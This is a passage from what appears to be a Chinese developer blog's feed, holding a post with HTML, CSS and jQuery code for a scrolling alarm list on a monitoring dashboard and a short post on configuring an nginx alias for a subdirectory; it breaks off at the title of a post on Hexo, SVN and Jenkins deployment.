    <content type="html"><![CDATA[<ul><li><a href="https://github.com/dr34m-cn/wrnlist">项目地址</a></li></ul><span id="more"></span><ul><li><code>index.html</code></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>告警<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./css/warning.css&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;wrnList&quot;</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">&quot;mouseEnter()&quot;</span> <span class="hljs-attr">onmouseout</span>=<span class="hljs-string">&quot;mouseLeave()&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;clickList()&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;wrnList&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://libs.baidu.com/jquery/2.0.0/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./index.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><ul><li><code>warning.css</code></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">html</span>,<br><span class="hljs-selector-tag">body</span> &#123;<br><span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;<br><span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;<br><span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;<br><span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;<br><span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">13</span>, <span class="hljs-number">20</span>, <span class="hljs-number">46</span>, <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-selector-class">.wrnList</span> &#123;<br><span class="hljs-attribute">width</span>: <span class="hljs-number">416px</span>;<br><span class="hljs-attribute">height</span>: <span class="hljs-number">290px</span>;<br><span class="hljs-attribute">position</span>: absolute;<br><span class="hljs-attribute">z-index</span>: <span class="hljs-number">999</span>;<br><span class="hljs-attribute">top</span>: <span class="hljs-number">82px</span>;<br><span class="hljs-attribute">right</span>: <span class="hljs-number">14px</span>;<br><span class="hljs-attribute">overflow</span>: hidden;<br>&#125;<br><br><span class="hljs-selector-id">#wrnList</span> &#123;<br><span class="hljs-attribute">pointer-events</span>: none;<br>&#125;<br><br><span class="hljs-selector-class">.wrnItem</span> &#123;<br><span class="hljs-attribute">margin</span>: <span class="hljs-number">9px</span> auto;<br><span class="hljs-attribute">height</span>: <span class="hljs-number">46px</span>;<br><span class="hljs-attribute">width</span>: <span class="hljs-number">302px</span>;<br><span class="hljs-attribute">background-repeat</span>: no-repeat;<br><span class="hljs-attribute">display</span>: flex;<br><span class="hljs-attribute">align-items</span>: center;<br><span class="hljs-attribute">font-size</span>: <span class="hljs-number">13px</span>;<br><span class="hljs-attribute">color</span>: <span class="hljs-number">#FFFFFF</span>;<br>&#125;<br><br><span class="hljs-selector-class">.child_1</span>,<span class="hljs-selector-class">.child_5</span>,<span class="hljs-selector-class">.child_6</span>  &#123;<br><span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">40px</span>;<br><span class="hljs-attribute">width</span>: <span class="hljs-built_in">calc</span>(<span class="hljs-number">302px</span> - <span class="hljs-number">80px</span>);<br><span class="hljs-attribute">height</span>: <span class="hljs-number">46px</span>;<br><span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.3</span>;<br><span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;./../img/wrn/small.png&#x27;</span>);<br><span class="hljs-attribute">background-size</span>: <span class="hljs-number">302px</span> auto;<br>&#125;<br><br><span class="hljs-selector-class">.child_2</span>,<span class="hljs-selector-class">.child_4</span> &#123;<br><span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">40px</span>;<br><span class="hljs-attribute">width</span>: <span class="hljs-built_in">calc</span>(<span class="hljs-number">302px</span> - <span class="hljs-number">80px</span>);<br><span class="hljs-attribute">height</span>: <span class="hljs-number">46px</span>;<br><span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.6</span>;<br><span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;./../img/wrn/small.png&#x27;</span>);<br><span class="hljs-attribute">background-size</span>: <span class="hljs-number">302px</span> auto;<br>&#125;<br><br><span class="hljs-selector-class">.child_3</span> &#123;<br><span class="hljs-attribute">position</span>: relative;<br><span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">50px</span>;<br><span class="hljs-attribute">width</span>: <span class="hljs-built_in">calc</span>(<span class="hljs-number">416px</span> - <span class="hljs-number">100px</span>);<br><span class="hljs-attribute">height</span>: <span class="hljs-number">58px</span>;<br><span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>;<br><span class="hljs-attribute">background-size</span>: <span class="hljs-number">100%</span> auto;<br><span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;./../img/wrn/big.png&#x27;</span>);<br>&#125;<br><br><span class="hljs-selector-class">.anim</span> &#123;<br><span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.4s</span>;<br>&#125;<br><br><span class="hljs-selector-class">.wrnItemTime</span> &#123;<br><span class="hljs-attribute">white-space</span>: nowrap;<br><span class="hljs-attribute">padding-left</span>: <span class="hljs-number">24px</span>;<br><span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;./../img/wrn/wrning.png&#x27;</span>);<br><span class="hljs-attribute">background-repeat</span>: no-repeat;<br><span class="hljs-attribute">background-position</span>: -<span class="hljs-number">6px</span> -<span class="hljs-number">5px</span>;<br><span class="hljs-attribute">overflow</span>: hidden;<br><span class="hljs-attribute">text-overflow</span>: ellipsis;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>index.js</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> wrnList = [<br>&#123; <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;deviceType&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;pressure过高&quot;</span>, <span class="hljs-string">&quot;createTime&quot;</span>: <span class="hljs-string">&quot;2020-10-20 13:34:05&quot;</span>, <span class="hljs-string">&quot;areaName&quot;</span>: <span class="hljs-string">&quot;某某区1&quot;</span>&#125;,<br>&#123; <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&quot;deviceType&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;tds过低&quot;</span>, <span class="hljs-string">&quot;createTime&quot;</span>: <span class="hljs-string">&quot;2020-10-20 13:04:44&quot;</span>, <span class="hljs-string">&quot;areaName&quot;</span>: <span class="hljs-string">&quot;某某区2&quot;</span>&#125;,<br>&#123; <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&quot;deviceType&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;tds过低&quot;</span>, <span class="hljs-string">&quot;createTime&quot;</span>: <span class="hljs-string">&quot;2020-10-20 13:04:44&quot;</span>, <span class="hljs-string">&quot;areaName&quot;</span>: <span class="hljs-string">&quot;某某区3&quot;</span>&#125;,<br>&#123; <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">4</span>, <span class="hljs-string">&quot;deviceType&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;tds过低&quot;</span>, <span class="hljs-string">&quot;createTime&quot;</span>: <span class="hljs-string">&quot;2020-10-20 13:04:44&quot;</span>, <span class="hljs-string">&quot;areaName&quot;</span>: <span class="hljs-string">&quot;某某区4&quot;</span>&#125;,<br>&#123; <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&quot;deviceType&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;pressure过高&quot;</span>, <span class="hljs-string">&quot;createTime&quot;</span>: <span class="hljs-string">&quot;2020-10-20 13:04:05&quot;</span>, <span class="hljs-string">&quot;areaName&quot;</span>: <span class="hljs-string">&quot;某某区5&quot;</span>&#125;,<br>&#123; <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">6</span>, <span class="hljs-string">&quot;deviceType&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;pressure过低&quot;</span>, <span class="hljs-string">&quot;createTime&quot;</span>: <span class="hljs-string">&quot;2020-10-20 12:34:05&quot;</span>, <span class="hljs-string">&quot;areaName&quot;</span>: <span class="hljs-string">&quot;某某区6&quot;</span>&#125;];<br><span class="hljs-keyword">var</span> timer = <span class="hljs-number">0</span>;<br><span class="hljs-title function_">mouseLeave</span>();<br><br><span class="hljs-comment">// 翻滚</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">autoScroll</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> dom = $(<span class="hljs-string">&quot;#wrnList&quot;</span>);<br>dom.<span class="hljs-title function_">css</span>(<span class="hljs-string">&#x27;margin-top&#x27;</span>, <span class="hljs-string">&#x27;-56px&#x27;</span>);<br>dom.<span class="hljs-title function_">addClass</span>(<span class="hljs-string">&#x27;anim&#x27;</span>);<br><span class="hljs-comment">// 第三行变第二行</span><br><span class="hljs-keyword">var</span> child3 = $(<span class="hljs-string">&quot;.child_3&quot;</span>);<br><span class="hljs-comment">// child3.removeClass(&#x27;child_3&#x27;);</span><br><span class="hljs-comment">// child3.addClass(&#x27;child_2&#x27;);</span><br>child3.<span class="hljs-title function_">css</span>(<span class="hljs-string">&#x27;padding&#x27;</span>, <span class="hljs-string">&#x27;0 40px&#x27;</span>);<br>child3.<span class="hljs-title function_">css</span>(<span class="hljs-string">&#x27;opacity&#x27;</span>, <span class="hljs-string">&#x27;0.6&#x27;</span>);<br>child3.<span class="hljs-title function_">css</span>(<span class="hljs-string">&#x27;height&#x27;</span>, <span class="hljs-string">&#x27;46px&#x27;</span>);<br>child3.<span class="hljs-title function_">css</span>(<span class="hljs-string">&#x27;width&#x27;</span>, <span class="hljs-string">&#x27;calc(302px - 80px)&#x27;</span>);<br>child3.<span class="hljs-title function_">css</span>(<span class="hljs-string">&#x27;background-image&#x27;</span>, <span class="hljs-string">&quot;url(&#x27;./img/wrn/small.png&#x27;)&quot;</span>);<br>child3.<span class="hljs-title function_">css</span>(<span class="hljs-string">&#x27;background-size&#x27;</span>, <span class="hljs-string">&#x27;302px auto&#x27;</span>);<br>child3.<span class="hljs-title function_">addClass</span>(<span class="hljs-string">&#x27;anim&#x27;</span>);<br><span class="hljs-comment">// 第四行变第三行</span><br><span class="hljs-keyword">var</span> child4 = $(<span class="hljs-string">&quot;.child_4&quot;</span>);<br><span class="hljs-comment">// child4.removeClass(&#x27;child_4&#x27;);</span><br><span class="hljs-comment">// child4.addClass(&#x27;child_3&#x27;);</span><br>child4.<span class="hljs-title function_">css</span>(<span class="hljs-string">&#x27;padding&#x27;</span>, <span class="hljs-string">&#x27;0 50px&#x27;</span>);<br>child4.<span class="hljs-title function_">css</span>(<span class="hljs-string">&#x27;opacity&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>);<br>child4.<span class="hljs-title function_">css</span>(<span class="hljs-string">&#x27;height&#x27;</span>, <span class="hljs-string">&#x27;58px&#x27;</span>);<br>child4.<span class="hljs-title function_">css</span>(<span class="hljs-string">&#x27;width&#x27;</span>, <span class="hljs-string">&#x27;calc(416px - 100px)&#x27;</span>);<br>child4.<span class="hljs-title function_">css</span>(<span class="hljs-string">&#x27;background-image&#x27;</span>, <span class="hljs-string">&quot;url(&#x27;./img/wrn/big.png&#x27;)&quot;</span>);<br>child4.<span class="hljs-title function_">css</span>(<span class="hljs-string">&#x27;background-size&#x27;</span>, <span class="hljs-string">&#x27;416px auto&#x27;</span>);<br>child4.<span class="hljs-title function_">addClass</span>(<span class="hljs-string">&#x27;anim&#x27;</span>);<br><span class="hljs-comment">// 第五行变第四行</span><br><span class="hljs-keyword">var</span> child5 = $(<span class="hljs-string">&quot;.child_5&quot;</span>);<br>child5.<span class="hljs-title function_">css</span>(<span class="hljs-string">&#x27;opacity&#x27;</span>, <span class="hljs-string">&#x27;0.6&#x27;</span>);<br>child5.<span class="hljs-title function_">addClass</span>(<span class="hljs-string">&#x27;anim&#x27;</span>);<br><span class="hljs-comment">// 第二行变第一行</span><br><span class="hljs-keyword">var</span> child2 = $(<span class="hljs-string">&quot;.child_2&quot;</span>);<br>child2.<span class="hljs-title function_">css</span>(<span class="hljs-string">&#x27;opacity&#x27;</span>, <span class="hljs-string">&#x27;0.3&#x27;</span>);<br>child2.<span class="hljs-title function_">addClass</span>(<span class="hljs-string">&#x27;anim&#x27;</span>);<br><span class="hljs-keyword">var</span> that = <span class="hljs-variable language_">this</span>;<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>that.<span class="hljs-property">wrnList</span>.<span class="hljs-title function_">push</span>(that.<span class="hljs-property">wrnList</span>[<span class="hljs-number">0</span>]);<br>that.<span class="hljs-property">wrnList</span>.<span class="hljs-title function_">shift</span>();<br>that.<span class="hljs-title function_">insertWrn</span>();<br>dom.<span class="hljs-title function_">css</span>(<span class="hljs-string">&#x27;margin-top&#x27;</span>, <span class="hljs-string">&#x27;0px&#x27;</span>);<br>dom.<span class="hljs-title function_">removeClass</span>(<span class="hljs-string">&#x27;anim&#x27;</span>);<br>child3.<span class="hljs-title function_">removeClass</span>(<span class="hljs-string">&#x27;anim&#x27;</span>);<br>child4.<span class="hljs-title function_">removeClass</span>(<span class="hljs-string">&#x27;anim&#x27;</span>);<br>child5.<span class="hljs-title function_">removeClass</span>(<span class="hljs-string">&#x27;anim&#x27;</span>);<br>child2.<span class="hljs-title function_">removeClass</span>(<span class="hljs-string">&#x27;anim&#x27;</span>);<br>&#125;, <span class="hljs-number">400</span>);<br>&#125;<br><br><span class="hljs-comment">// 插数据方法</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">insertWrn</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> hl = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">var</span> wrnType = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i <span class="hljs-keyword">in</span> wrnList) &#123;<br><span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">6</span>) &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (wrnList[i].<span class="hljs-property">deviceType</span> == <span class="hljs-number">4</span> || wrnList[i].<span class="hljs-property">deviceType</span> == <span class="hljs-number">5</span>) &#123;<br>wrnType = <span class="hljs-string">&#x27;用水报警&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (wrnList[i].<span class="hljs-property">deviceType</span> == <span class="hljs-number">2</span> || wrnList[i].<span class="hljs-property">deviceType</span> == <span class="hljs-number">3</span> || wrnList[i].<span class="hljs-property">deviceType</span> == <span class="hljs-number">7</span>) &#123;<br>wrnType = <span class="hljs-string">&#x27;管网报警&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (wrnList[i].<span class="hljs-property">deviceType</span> == <span class="hljs-number">6</span>) &#123;<br>wrnType = <span class="hljs-string">&#x27;用电报警&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (wrnList[i].<span class="hljs-property">deviceType</span> == <span class="hljs-number">1</span>) &#123;<br>wrnType = <span class="hljs-string">&#x27;空气报警&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>wrnType = <span class="hljs-string">&#x27;未知报警&#x27;</span>;<br>&#125;<br>hl += <span class="hljs-string">`&lt;div class=&quot;wrnItem child_<span class="hljs-subst">$&#123;<span class="hljs-built_in">parseInt</span>(i) + <span class="hljs-number">1</span>&#125;</span>&quot;&gt;&lt;div class=&quot;wrnItemTime&quot;&gt;<span class="hljs-subst">$&#123;wrnList[i].areaName&#125;</span> <span class="hljs-subst">$&#123;wrnList[i].content&#125;</span> <span class="hljs-subst">$&#123;wrnType&#125;</span> <span class="hljs-subst">$&#123;wrnList[i].createTime&#125;</span>&lt;/div&gt;&lt;/div&gt;`</span>;<br>&#125;<br>$(<span class="hljs-string">&quot;#wrnList&quot;</span>).<span class="hljs-title function_">html</span>(hl);<br>&#125;<br><br><span class="hljs-comment">// 告警列表点击事件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">clickList</span>(<span class="hljs-params">event</span>) &#123;<br><span class="hljs-keyword">var</span> itemId = wrnList[<span class="hljs-number">2</span>].<span class="hljs-property">id</span>;<br><span class="hljs-keyword">var</span> e = event || <span class="hljs-variable language_">window</span>.<span class="hljs-property">event</span>;<br><span class="hljs-keyword">var</span> winWidth = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>;<br><span class="hljs-comment">// console.log(&quot;winWidth&quot;, winWidth);</span><br><span class="hljs-keyword">let</span> x = e.<span class="hljs-property">clientX</span>;<br><span class="hljs-keyword">let</span> y = e.<span class="hljs-property">clientY</span>;<br><span class="hljs-comment">// console.log(&quot;x&quot;, x);</span><br><span class="hljs-comment">// console.log(&quot;y&quot;, y);</span><br><span class="hljs-keyword">let</span> right_margin = winWidth - x;<br><span class="hljs-keyword">let</span> top_margin = y;<br><span class="hljs-comment">// console.log(&quot;right_margin&quot;,right_margin);</span><br><span class="hljs-comment">// console.log(&quot;top_margin&quot;,top_margin);</span><br><span class="hljs-keyword">if</span> (top_margin &lt;= <span class="hljs-number">285</span> &amp;&amp; top_margin &gt;= <span class="hljs-number">256</span>) &#123;<br><span class="hljs-keyword">if</span> (right_margin &gt;= <span class="hljs-number">153</span> &amp;&amp; right_margin &lt;= <span class="hljs-number">223</span>) &#123;<br><span class="hljs-comment">// console.log(&quot;发起工单&quot;);</span><br><span class="hljs-comment">// addWorkOrder(itemId);</span><br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;发起工单&quot;</span> + itemId);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (right_margin &gt; <span class="hljs-number">223</span> &amp;&amp; right_margin &lt;= <span class="hljs-number">394</span>) &#123;<br><span class="hljs-comment">// console.log(&quot;忽略&quot;);</span><br><span class="hljs-comment">// ignoreWarning(itemId);</span><br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;误报&quot;</span> + itemId);<br>&#125;<br>&#125;<br><span class="hljs-comment">// console.log(&quot;i&quot;, i);</span><br><span class="hljs-comment">// console.log(&quot;itemId&quot;, itemId);</span><br><br>&#125;<br><br><span class="hljs-comment">// 鼠标移入</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">mouseEnter</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-comment">// console.log(&quot;mouseEnter&quot;);</span><br><span class="hljs-keyword">if</span> (timer != <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">clearInterval</span>(timer);<br>&#125;<br><span class="hljs-keyword">var</span> child = $(<span class="hljs-string">&quot;.child_3&quot;</span>);<br>child.<span class="hljs-title function_">css</span>(<span class="hljs-string">&#x27;padding-bottom&#x27;</span>, <span class="hljs-string">&#x27;34px&#x27;</span>);<br>child.<span class="hljs-title function_">css</span>(<span class="hljs-string">&#x27;background-image&#x27;</span>, <span class="hljs-string">&quot;url(&#x27;./img/wrn/big_on.png&#x27;)&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 鼠标离开</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">mouseLeave</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-title function_">insertWrn</span>();<br><span class="hljs-keyword">if</span> (wrnList.<span class="hljs-property">length</span> &gt; <span class="hljs-number">3</span>) &#123;<br>timer = <span class="hljs-built_in">setInterval</span>(autoScroll, <span class="hljs-number">1800</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>原理自己探索吧，项目需求有些特别，所以有的地方比较定制化，自己用的话可能要做不少修改。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nginx代理网站子目录到本地目录</title>
    <link href="/2020/11/post251/"/>
    <url>/2020/11/post251/</url>
    
    <content type="html"><![CDATA[<p>使用nginx的alias即可，例如下边的配置将子目录<code>static_web</code>代理到<code>/www/wwwroot/bg.ctftools.com</code>路径，访问<code>http://xxx.xx/static_web/index.html</code>即可达<code>/www/wwwroot/bg.ctftools.com/index.html</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span><span class="hljs-regexp"> ^~</span> /static_web &#123;<br>    <span class="hljs-attribute">alias</span> /www/wwwroot/bg.ctftools.com;<br>    <span class="hljs-attribute">index</span> index.html;<br>    <span class="hljs-attribute">try_files</span> <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /static_web/index.html;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>centos下hexo + svn + jenkins实现博客自动部署</title>
    <link href="/2020/11/post249/"/>
    <url>/2020/11/post249/</url>
    
